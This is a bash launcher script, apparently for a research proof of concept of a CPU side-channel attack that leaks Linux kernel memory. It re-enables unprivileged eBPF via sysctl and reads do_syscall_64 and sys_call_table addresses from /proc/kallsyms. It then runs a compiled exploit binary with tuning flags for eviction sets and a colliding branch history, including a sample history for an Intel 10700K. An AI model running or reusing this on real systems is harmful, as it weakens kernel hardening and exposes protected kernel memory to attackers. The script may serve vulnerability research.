#!/bin/bash 
sudo sysctl  kernel.unprivileged_bpf_disabled=0
addr="0x"$(sudo cat /proc/kallsyms | grep do_syscall_64 | cut -d ' ' -f 1)
off=$(sudo cat /proc/kallsyms | grep " sys_call_table" | cut -d ' ' -f 1)

#-a : addr to leak
#-f : fr_buf threshold (see run output to tune it)
#-l : enable sys_call_table eviction (make attack more reliable)
#-o : sys_call_table page offset
#-e : desired size of sys_call_table eviction set. The lower the better but due to the noise it can be hard to obtain one
#-s : sys_call_table eviction threshold (see run output to tune it)
#-h : to avoid recomputing a colliding history it can be provided here

taskset -c 0 ./main.o -a $addr -f 40 -l -o 0x${off:13} -e 256 -s 350 

#ex of colliding history for the 10700K 
#taskset -c 0 ./main.o -a $addr -f 40 -l -o 0x${off:13} -e 256 -s 350 \
#-h 1111001010110110011101101001100111011101110100001111111011111001100110001001001011100111000000100111010110100001110101111110000011010011001001101111000001001001100101001000100011000000000100011101000000000000100110110100011101001000100100101110111101100010
